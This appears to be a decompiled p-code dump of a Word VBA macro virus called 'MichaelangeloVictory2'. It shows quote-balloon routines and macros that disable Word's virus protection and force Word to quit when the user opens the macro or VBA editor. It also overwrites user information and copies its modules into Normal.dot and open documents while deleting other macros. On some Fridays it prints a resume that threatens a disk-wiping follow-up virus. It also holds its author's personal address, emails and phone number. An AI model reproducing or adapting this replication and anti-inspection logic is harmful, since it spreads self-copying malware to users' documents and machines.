' 	LitStr 0x0019 "On Tracking Down an Error"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "  "And if you can take one from three"
' 	Concat 
' 	LitStr 0x0027 " hundred and sixty-five, what remains?""
' 	Concat 
' 	LitStr 0x0037 "  "Three hundred and sixty-four of course", Alice said."
' 	Concat 
' 	LitStr 0x004F "  Humpty Dumpty looked doubtful.  "I'd rather see that done in paper", he said."
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0015 "--Alice in Wonderland"
' 	Concat 
' 	LitDI2 0x0009 
' 	ArgsSt quotes 0x0001 
' Line #48:
' Line #49:
' 	LineCont 0x0034 07 00 11 00 13 00 11 00 15 00 11 00 17 00 11 00 19 00 11 00 1B 00 11 00 1D 00 11 00 1F 00 11 00 21 00 11 00 23 00 11 00 25 00 11 00 27 00 11 00 29 00 11 00
' 	LitStr 0x0017 "On Good Variable Naming"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0019 "  "Don't stand chattering"
' 	Concat 
' 	LitStr 0x002D " to yourself like that," Humpty Dumpty said, "
' 	Concat 
' 	LitStr 0x0031 " looking at her for the first time, "but tell me "
' 	Concat 
' 	LitStr 0x0023 " your name and your business."  "My"
' 	Concat 
' 	LitStr 0x0021 " name is Alice, but --".  "It's a"
' 	Concat 
' 	LitStr 0x0024 " stupid name enough!", Humpty Dumpty"
' 	Concat 
' 	LitStr 0x0025 " interrupted impatiently.  "What does"
' 	Concat 
' 	LitStr 0x002F " it mean?", "Must a name mean something?" Alice"
' 	Concat 
' 	LitStr 0x0030 " asked doubtfully.  "Of course it must,"  Humpty"
' 	Concat 
' 	LitStr 0x0034 " Dumpty said with a short laugh:  "My name means the"
' 	Concat 
' 	LitStr 0x0037 " shape that I am and a good handsome shape it is, too. "
' 	Concat 
' 	LitStr 0x0031 " With a name like yours, you might be any shape, "
' 	Concat 
' 	LitStr 0x0009 " almost.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsSt quotes 0x0001 
' Line #50:
' Line #51:
' 	LineCont 0x0004 07 00 11 00
' 	LitStr 0x0037 ""First thing first, but not necessarily in that order.""
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "--Dr. Who, Meglos"
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsSt quotes 0x0001 
' Line #52:
' Line #53:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x003A ""The significant problems we face cannot be solved by the "
' 	LitStr 0x002A "same level of thinking that created them.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "--Albert Einstein"
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsSt quotes 0x0001 
' Line #54:
' Line #55:
' 	LineCont 0x0010 07 00 11 00 13 00 11 00 15 00 11 00 17 00 11 00
' 	LitStr 0x0022 "On Creating, Inhertance in Classes"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002F ""You will understand this when I tell you that "
' 	Concat 
' 	LitStr 0x003A "I can trace my ancestry back to a protoplasmal primordial "
' 	Concat 
' 	LitStr 0x000A " globule.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0022 "--Gilbert and Sullivan, the Mikado"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsSt quotes 0x0001 
' Line #56:
' Line #57:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x003A ""Words are so powerful, but I found it powerfully useless "
' 	LitStr 0x002C "just to come up with a statement like this.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "--Michael I. Buen"
' 	Concat 
' 	LitDI2 0x000E 
' 	ArgsSt quotes 0x0001 
' Line #58:
' Line #59:
' 	LineCont 0x0010 07 00 11 00 13 00 11 00 15 00 11 00 17 00 11 00
' 	LitStr 0x0015 "On Temporary Solution"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0034 ""One powerful heuristic tool is brure force.  Don't "
' 	Concat 
' 	LitStr 0x0044 "underestimate it.  A brute force solution is better than an elegant "
' 	Concat 
' 	LitStr 0x001C "solution that doesn't work.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "--Steve McConnell"
' 	Concat 
' 	LitDI2 0x000F 
' 	ArgsSt quotes 0x0001 
' Line #60:
' Line #61:
' 	LineCont 0x0014 07 00 11 00 13 00 11 00 15 00 11 00 17 00 11 00 19 00 11 00
' 	LitStr 0x0017 "On Design Process Stage"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0030 ""We try to solve the problem by rushing through "
' 	Concat 
' 	LitStr 0x003D "the design process so that enough time is left at the end of "
' 	Concat 
' 	LitStr 0x003F "project to uncover the errors that were made because we rushed "
' 	Concat 
' 	LitStr 0x001C "through the design process.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "--Glenford Myers"
' 	Concat 
' 	LitDI2 0x0010 
' 	ArgsSt quotes 0x0001 
' Line #62:
' Line #63:
' 	LineCont 0x000C 11 00 11 00 13 00 11 00 15 00 11 00
' 	LitStr 0x0019 "On Premature Optimization"
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003D ""We should forget about small efficiencies, say about 97% of "
' 	Concat 
' 	LitStr 0x003A "the time: premature optimization is the root of all evil.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000E "--Donald Knuth"
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsSt quotes 0x0001 
' Line #64:
' Line #65:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x0034 ""The problem definition lays the foundation for the "
' 	LitStr 0x0021 "rest of the programming process.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "--Steve McConnell"
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsSt quotes 0x0001 
' Line #66:
' Line #67:
' 	LineCont 0x0008 07 00 11 00 09 00 11 00
' 	LitStr 0x0030 ""From a programmer's point of view, the user is "
' 	LitStr 0x0037 "a peripheral that types when you issue a read request.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "--Peter Williams"
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsSt quotes 0x0001 
' Line #68:
' Line #69:
' 	LineCont 0x0010 07 00 11 00 09 00 11 00 0B 00 11 00 0D 00 11 00
' 	LitStr 0x0038 ""Programming today is a race between software engineers "
' 	LitStr 0x003A "striving to build bigger and better idiot-proof programs, "
' 	Concat 
' 	LitStr 0x003D "and the universe trying to produce bigger and better idiots. "
' 	Concat 
' 	LitStr 0x0020 "So far the universe is winning.""
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000B "--Rich Cook"
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsSt quotes 0x0001 
' Line #70:
' Line #71:
' 	LineCont 0x0004 07 00 11 00
' 	LitStr 0x0038 ""I can do everything through Him who gives me strength.""
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0034 "--Philipians 4:13 (courtesy of Byron2 James C. Ngan)"
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsSt quotes 0x0001 
' Line #72:
' Line #73:
' 	QuoteRem 0x0004 0x000E "Call Randomize"
' Line #74:
' Line #75:
' 	Do 
' Line #76:
' 	ArgsLd Randomize 0x0000 
' 	St currQuote 
' Line #77:
' 	Ld currQuote 
' 	Ld prevQuote 
' 	Eq 
' 	LoopWhile 
' Line #78:
' Line #79:
' 	SetStmt 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	Set qBal 
' Line #80:
' 	LitStr 0x0014 "Quote for the Moment"
' 	Ld qBal 
' 	MemSt Heading 
' Line #81:
' 	Ld msoAnimationThinking 
' 	Ld qBal 
' 	MemSt Animation 
' Line #82:
' 	Ld currQuote 
' 	ArgsLd quotes 0x0001 
' 	Ld qBal 
' 	MemSt Then 
' Line #83:
' 	Ld qBal 
' 	ArgsMemCall Show 0x0000 
' Line #84:
' Line #85:
' 	Ld currQuote 
' 	St prevQuote 
' Line #86:
' 	LitDI2 0x0001 
' 	St Quote 
' Line #87:
' 	EndFunc 
' Line #88:
' Line #89:
' Line #90:
' 	FuncDefn (Sub ViewVBCode())
' Line #91:
' 	QuoteRem 0x0000 0x0000 ""
' Line #92:
' 	QuoteRem 0x0000 0x0011 " ViewVBCode Macro"
' Line #93:
' 	QuoteRem 0x0000 0x0021 " Shows the VB editing environment"
' Line #94:
' 	QuoteRem 0x0000 0x0000 ""
' Line #95:
' 	Dim 
' 	VarDefn d (As Document)
' Line #96:
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #99:
' Line #100:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #101:
' 	LitVarSpecial (True)
' 	Ld d 
' 	MemSt Saved 
' Line #102:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' Line #103:
' Line #104:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #105:
' Line #106:
' 	EndSub 
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' 	FuncDefn (Sub ToolsOptions())
' Line #112:
' 	QuoteRem 0x0000 0x0000 ""
' Line #113:
' 	QuoteRem 0x0000 0x0013 " ToolsOptions Macro"
' Line #114:
' 	QuoteRem 0x0000 0x0037 " Changes various categories of Word for Windows options"
' Line #115:
' 	QuoteRem 0x0000 0x0000 ""
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #118:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #119:
' 	LitStr 0x0029 "Michaelangelo "The Skulltor\n" Buenarroti"
' 	St Signature 
' Line #120:
' 	Ld Signature 
' 	Ld Application 
' 	MemSt UserName 
' Line #121:
' 	LitStr 0x0003 "MIB"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #122:
' 	LineCont 0x0010 06 00 08 00 08 00 08 00 0F 00 08 00 1B 00 08 00
' 	LitStr 0x0000 ""
' 	LitStr 0x002A "Block 6 Lot 3 Hauskon Homes, Daang Amaya, "
' 	Concat 
' 	LitStr 0x000C "Tanza Cavite"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003F "e-mail address: mycklangelo@yahoo.com / mycklangelo@hotmail.com"
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0013 "Tel: (046)505-17-39"
' 	Concat 
' 	Ld Application 
' 	MemSt UserAddress 
' Line #123:
' Line #124:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #125:
' Line #126:
' Line #127:
' 	EndSub 
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' 	FuncDefn (Sub ToolsMacro())
' Line #132:
' 	Dim 
' 	VarDefn d (As Document)
' Line #133:
' Line #134:
' 	OnError (Resume Next) 
' Line #135:
' Line #136:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #137:
' Line #138:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #139:
' 	LitVarSpecial (True)
' 	Ld d 
' 	MemSt Saved 
' Line #140:
' 	StartForVariable 
' 	Ld d 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' Line #142:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #143:
' Line #144:
' 	EndSub 
' Line #145:
' Line #146:
' 	FuncDefn (Sub FilePrintDefault())
' Line #147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #148:
' 	QuoteRem 0x0000 0x0017 " FilePrintDefault Macro"
' Line #149:
' 	QuoteRem 0x0000 0x0036 " Prints the active document using the current defaults"
' Line #150:
' 	QuoteRem 0x0000 0x0000 ""
' Line #151:
' 	Dim 
' 	VarDefn freeF (As Integer)
' Line #152:
' Line #153:
' 	OnError (Resume Next) 
' Line #154:
' Line #155:
' Line #156:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Paren 
' 	Ld vbFriday 
' 	Ne 
' 	IfBlock 
' Line #157:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #158:
' 	End 
' Line #159:
' 	EndIfBlock 
' Line #160:
' Line #161:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0017 
' 	Gt 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #162:
' Line #163:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	Ld vbArchive 
' 	ArgsCall (Call) SetAttr 0x0002 
' Line #164:
' 	Ld Friend 
' 	St freeF 
' Line #165:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	ArgsCall Kill 0x0001 
' Line #166:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	Ld freeF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #167:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Resume"
' 	PrintItemNL 
' Line #168:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #169:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Applicant's Name: Michael I. Buen"
' 	PrintItemNL 
' Line #170:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #171:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "Address: Block 6 Lot 3 Hauskon Homes, Daang Amaya, Tanza Cavite"
' 	PrintItemNL 
' Line #172:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "Tel:     (046)505-17-39"
' 	PrintItemNL 
' Line #173:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "Desired Position: Programmer/Technical Writer/Computer Salesman"
' 	PrintItemNL 
' Line #174:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #175:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "Skills: Knows C/C++, Assembly, Pascal, COBOL, Clipper, Foxpro, "
' 	PrintItemNL 
' Line #176:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "        JavaScript, VBScript, Visual Basic, VB for Application "
' 	PrintItemNL 
' Line #177:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "        Programming, Access, Clarion, HTML, Batch File"
' 	PrintItemNL 
' Line #178:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #179:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004C "Applications Expertise: Resource Workshop, Aldus Pagemaker, Adobe Photoshop,"
' 	PrintItemNL 
' Line #180:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "        Lotus Smartsuite, Microangelo, and Of Course Excel and "
' 	PrintItemNL 
' Line #181:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "        Microsoft Word"
' 	PrintItemNL 
' Line #182:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #183:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0045 "Favorite Quote: "The cure for boredom is curiosity, there is no cure "
' 	PrintItemNL 
' Line #184:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "                for curiosity""
' 	PrintItemNL 
' Line #185:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #186:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "With Experiences In: Innodata, SENCOR, VMSCI, GenDiesel"
' 	PrintItemNL 
' Line #187:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #188:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0051 "Without Experiences In: Chowking, J-Sys, Jimac, CBSI, Information Professionals, "
' 	PrintItemNL 
' Line #189:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "                        Midas Kapiti, James Martin + co, Professional Staffers, "
' 	PrintItemNL 
' Line #190:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0042 "                        Ergonomics, Express Telecom, 650 Companies"
' 	PrintItemNL 
' Line #191:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #192:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #193:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0037 "e-mail: mycklangelo@yahoo.com / mycklangelo@hotmail.com"
' 	PrintItemNL 
' Line #194:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "Address: Block 6 Lot 3, Hauskon Homes, Daang Amaya, Tanza Cavite"
' 	PrintItemNL 
' Line #195:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "tel: (046) 505-17-39"
' 	PrintItemNL 
' Line #196:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #197:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "To open my interactive resume type markbuen then highlight it"
' 	PrintItemNL 
' Line #198:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "then open a file, then my interactive resume will pop up"
' 	PrintItemNL 
' Line #199:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #200:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "Warning: If I don't get a stable job by the end of the month"
' 	PrintItemNL 
' Line #201:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003B "         I will release a third virus that will remove all "
' 	PrintItemNL 
' Line #202:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "         folders in the Primary Hard Disk, or in layman's term"
' 	PrintItemNL 
' Line #203:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0033 "         para ko na ring fi-normat ang Hard Disk Mo"
' 	PrintItemNL 
' Line #204:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #205:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "-- Be a Superlearner, Enroll at AMACConda Computer College"
' 	PrintItemNL 
' Line #206:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #207:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 ""Programming today is a race between software engineers "
' 	PrintItemNL 
' Line #208:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003A "striving to build bigger and better idiot-proof programs, "
' 	PrintItemNL 
' Line #209:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "and the universe trying to produce bigger and better idiots. "
' 	PrintItemNL 
' Line #210:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "So far the universe is winning.""
' 	PrintItemNL 
' Line #211:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "---Rich Cook"
' 	PrintItemNL 
' Line #212:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #213:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "Sa year 2004 FPJ for President, Noli de Castro for Vice President"
' 	PrintItemNL 
' Line #214:
' 	Ld freeF 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x000F 
' 	ArgsLd Chr 0x0001 
' 	PrintItemNL 
' Line #215:
' 	Ld freeF 
' 	Sharp 
' 	Close 0x0001 
' Line #216:
' 	LitStr 0x0014 "c:\windows\dummy.txt"
' 	ParamNamed FileName 
' 	Ld Application 
' 	ArgsMemCall PrintOut 0x0001 
' Line #217:
' 	QuoteRem 0x0008 0x001B "Kill "c:\windows\dummy.txt""
' Line #218:
' 	EndIfBlock 
' Line #219:
' Line #220:
' Line #221:
' Line #222:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #223:
' Line #224:
' 	EndSub 
' Line #225:
' Line #226:
' Line #227:
' Line #228:
' 	FuncDefn (Sub OnlyUs())
' Line #229:
' 	OnError (Resume Next) 
' Line #230:
' 	Dim 
' 	VarDefn NTInfected (As Boolean)
' Line #231:
' 	Dim 
' 	VarDefn itemName (As String)
' Line #232:
' 	Dim 
' 	VarDefn openDoc (As Document)
' Line #233:
' 	Dim 
' 	VarDefn odInfected (As Boolean)
' Line #234:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #235:
' Line #236:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #237:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #238:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #239:
' 	Ld New 
' 	LitStr 0x0015 "MichaelangeloVictory2"
' 	Eq 
' 	IfBlock 
' Line #240:
' 	LitVarSpecial (True)
' 	St NTInfected 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	LineCont 0x0010 05 00 0F 00 09 00 0F 00 0D 00 0F 00 11 00 0F 00
' 	Ld itemName 
' 	LitStr 0x0015 "MichaelangeloVictory2"
' 	Eq 
' 	Ld itemName 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Or 
' 	Ld itemName 
' 	LitStr 0x0006 "Byron2"
' 	Eq 
' 	Or 
' 	Ld itemName 
' 	LitStr 0x000A "Character2"
' 	Eq 
' 	Or 
' 	Ld itemName 
' 	LitStr 0x0013 "Reference to Normal"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #243:
' 	GoTo Skip 
' 	QuoteRem 0x001A 0x004D "since there is no continue(in C language) in VB goto will compensate for that"
' Line #244:
' 	EndIfBlock 
' Line #245:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld itemName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #246:
' 	Label Skip 
' Line #247:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #248:
' Line #249:
' 	QuoteRem 0x0004 0x000D "remove others"
' Line #250:
' 	Ld NTInfected 
' 	Not 
' 	IfBlock 
' Line #251:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0015 "MichaelangeloVictory2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #252:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Byron2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #253:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "Character2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #254:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #255:
' 	EndIfBlock 
' Line #256:
' Line #257:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #258:
' Line #259:
' 	LitVarSpecial (False)
' 	St odInfected 
' 	QuoteRem 0x001B 0x0011 "false tentatively"
' Line #260:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #261:
' 	Ld i 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St itemName 
' Line #262:
' 	Ld itemName 
' 	LitStr 0x0015 "MichaelangeloVictory2"
' 	Eq 
' 	IfBlock 
' Line #263:
' 	LitVarSpecial (True)
' 	St odInfected 
' Line #264:
' 	EndIfBlock 
' Line #265:
' 	LineCont 0x0010 05 00 10 00 09 00 10 00 0D 00 10 00 11 00 10 00
' 	Ld itemName 
' 	LitStr 0x0015 "MichaelangeloVictory2"
' 	Eq 
' 	Ld itemName 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	Or 
' 	Ld itemName 
' 	LitStr 0x0006 "Byron2"
' 	Eq 
' 	Or 
' 	Ld itemName 
' 	LitStr 0x000A "Character2"
' 	Eq 
' 	Or 
' 	Ld itemName 
' 	LitStr 0x0013 "Reference to Normal"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #266:
' 	GoTo Skip2 
' 	QuoteRem 0x001C 0x004D "since there is no continue(in C language) in VB goto will compensate for that"
' Line #267:
' 	EndIfBlock 
' Line #268:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld itemName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #269:
' 	Label Skip2 
' Line #270:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #271:
' Line #272:
